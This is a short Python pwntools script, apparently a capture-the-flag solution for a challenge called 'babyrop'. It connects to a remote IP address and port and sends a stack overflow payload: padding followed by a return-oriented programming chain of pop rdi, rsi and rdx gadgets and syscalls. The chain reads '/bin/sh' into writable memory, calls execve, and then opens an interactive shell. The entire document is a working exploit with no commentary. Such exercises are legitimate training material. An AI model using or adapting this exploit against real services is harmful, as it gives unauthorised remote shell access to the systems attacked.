from pwn import *

context(arch="amd64", os="linux")

#io = process("./babyrop")
io = remote('34.159.235.104', 30041)

# http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/linux_abi_x64
pop_rdi  = p64(0x401008) # pop rdi ; ret
pop_rsi  = p64(0x401023) # pop rsi ; pop r15 ; ret
pop_rdx  = p64(0x401015) # pop rdx ; ret
syscall  = p64(0x401048) # syscall
writable = p64(0x404000)

payload  = 0xd8 * b"A" + pop_rsi + writable + p64(0x0) + pop_rdi + p64(0x0) + pop_rdx + p64(0x3b) + syscall

payload += pop_rsi + p64(0x0) + p64(0x0) + pop_rdx + p64(0) + pop_rdi + writable + syscall

print("Payload len {}".format(len(payload)))

io.send(payload)

msg = io.recv(0x8)

print("First write {}".format(msg))

msg = io.recv(0xc8)

print("Second write {}".format(msg))

fill = b'/bin/sh\x00' + (0x3b - 0x8) * b'A'
io.send(fill)

io.interactive()
